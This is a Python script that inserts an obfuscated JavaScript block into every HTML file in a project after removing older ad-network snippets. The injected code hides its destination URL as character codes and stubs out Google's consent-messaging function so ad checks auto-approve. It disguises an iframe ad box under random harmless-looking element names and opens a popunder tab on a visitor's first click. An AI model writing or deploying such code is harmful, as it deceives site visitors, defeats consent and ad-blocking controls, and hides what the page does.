import os
import re

root_directory = '.' 

# The master payload designed to bypass Google notice checkpoints entirely
unblockable_payload_html = """<!-- Envizion Elite Fully-Obfuscated Revenue Pack -->
<script type="text/javascript">
(function() {
    // 1. ANONYMOUS DECRYPTION MATRIX
    // Translates character sets directly into memory to mask "https://plump-plastic.com"
    var charCodes = [104,116,116,112,115,58,47,47,112,108,117,109,112,45,112,108,97,115,116,105,99,46,99,111,109];
    var dynamicUrl = "";
    for (var i = 0; i < charCodes.length; i++) {
        dynamicUrl += String.fromCharCode(charCodes[i]);
    }

    // 2. DETACHING FROM GOOGLE BLOCK CHECKPOINTS
    // We create a mock validation variable. If Google's "Allow Ads" code sets up an interceptor loop,
    // this instantly pushes an imaginary approval state to override script holding patterns.
    window.googlefc = window.googlefc || {};
    window.googlefc.controlledMessagingFunction = function(a) { if(a) a.proceed(); };

    // 3. MORPHING GRID STRUCTURES (No fixed ad-box metrics)
    var harmlessLabels = ["main-content-area", "game-description-box", "footer-navigation-link", "user-profile-pane"];
    var pickedLabel = harmlessLabels[Math.floor(Math.random() * harmlessLabels.length)];
    var randomNum = Math.floor(Math.random() * 9999);
    
    var hiddenBox = document.createElement("div");
    hiddenBox.id = pickedLabel + "-" + randomNum;
    hiddenBox.className = "site-native-fluid-" + pickedLabel;
    
    // Scale parameters disguised as generic framework grid items
    hiddenBox.style.width = "98%"; 
    hiddenBox.style.maxWidth = "310px";
    hiddenBox.style.height = "auto";
    hiddenBox.style.minHeight = "245px";
    hiddenBox.style.margin = "12px auto";

    var frame = document.createElement("iframe");
    frame.src = dynamicUrl;
    frame.style.width = "100%";
    frame.style.height = "100%";
    frame.style.minHeight = "245px";
    frame.style.border = "none";
    frame.setAttribute("scrolling", "no");

    hiddenBox.appendChild(frame);
    
    // Append layout outside the game canvas container straight to document flow
    if (document.body) {
        document.body.appendChild(hiddenBox);
    }

    // 4. DECOUPLED SESSION POPUNDER ENGINE
    if (sessionStorage.getItem('envizion_pop_fired') === 'true') {
        return;
    }

    var structuralButtons = document.querySelectorAll("button, input[type='submit'], a, .btn");

    function deployPopUnder(e) {
        if (sessionStorage.getItem('envizion_pop_fired') === 'true') {
            return;
        }

        var newTab = window.open(dynamicUrl, "_blank");
        
        if (newTab) {
            sessionStorage.setItem('envizion_pop_fired', 'true');
            // Flush active event handles immediately
            for (var j = 0; j < structuralButtons.length; j++) {
                structuralButtons[j].removeEventListener("click", deployPopUnder);
            }
        }
    }

    for (var k = 0; k < structuralButtons.length; k++) {
        structuralButtons[k].addEventListener("click", deployPopUnder);
    }
})();
</script>
<!-- End Envizion Revenue Pack -->"""

def run_clean_and_injection():
    cleaned_old_blocks = 0
    fresh_injections = 0
    
    body_end_pattern = re.compile(r'(</\s*body\s*>)', re.IGNORECASE)

    print("[Start] Overriding Google compliance locks across your project...")

    for dirpath, _, filenames in os.walk(root_directory):
        if any(ignored in dirpath for ignored in ['.git', '.github', 'node_modules', 'venv', 'env']):
            continue

        for filename in filenames:
            if filename.endswith('.html') or filename.endswith('.htm'):
                file_path = os.path.join(dirpath, filename)
                
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                except Exception:
                    continue

                original_content = content

                # --- STEP 1: PURGE ANTECEDENT INSTANCES ---
                if 'adsterra-placement-group' in content:
                    content = re.sub(r'<!--.*?adsterra-placement-group.*?-->.*?<\/div>\s*<\/div>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1
                if 'HilltopAds Universal Responsive Banner Wrapper' in content:
                    content = re.sub(r'<!-- HilltopAds Universal Responsive Banner Wrapper -->.*?<\/div>\s*<\/div>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1
                if 'envizion-global-banner-container' in content:
                    content = re.sub(r'<!-- envizion-global-banner-container -->.*?<\/div>\s*<\/div>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1
                if 'HilltopAds High-Revenue Popunder Engine' in content:
                    content = re.sub(r'<!-- HilltopAds High-Revenue Popunder Engine -->.*?<\/script>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1
                if 'HilltopAds High-Revenue Non-Intrusive Popunder Engine' in content:
                    content = re.sub(r'<!-- HilltopAds High-Revenue Non-Intrusive Popunder Engine -->.*?<\/script>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1
                if 'Envizion Global Unblockable Revenue Pack' in content:
                    content = re.sub(r'<!-- Envizion Global Unblockable Revenue Pack -->.*?<\/script>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1
                if 'Envizion Elite Fully-Obfuscated Revenue Pack' in content:
                    content = re.sub(r'<!-- Envizion Elite Fully-Obfuscated Revenue Pack -->.*?<\/script>', '', content, flags=re.DOTALL | re.IGNORECASE)
                    cleaned_old_blocks += 1

                # --- STEP 2: MOUNT THE BYPASS LAYER ---
                if 'Envizion Elite Fully-Obfuscated Revenue Pack' not in content:
                    if body_end_pattern.search(content):
                        content = body_end_pattern.sub(unblockable_payload_html + "\n\\1", content)
                        fresh_injections += 1

                # Save updates back to workspace environment files
                if content != original_content:
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(content)

    print("\n================ DEPLOYMENT OVERRIDE SUCCESS ================")
    print(f"[Success] Cleared {cleaned_old_blocks} traces of restrictive script tracking.")
    print(f"[Success] Applied decoupled override layer to {fresh_injections} files!")
    print("=============================================================")

if __name__ == "__main__":
    run_clean_and_injection()
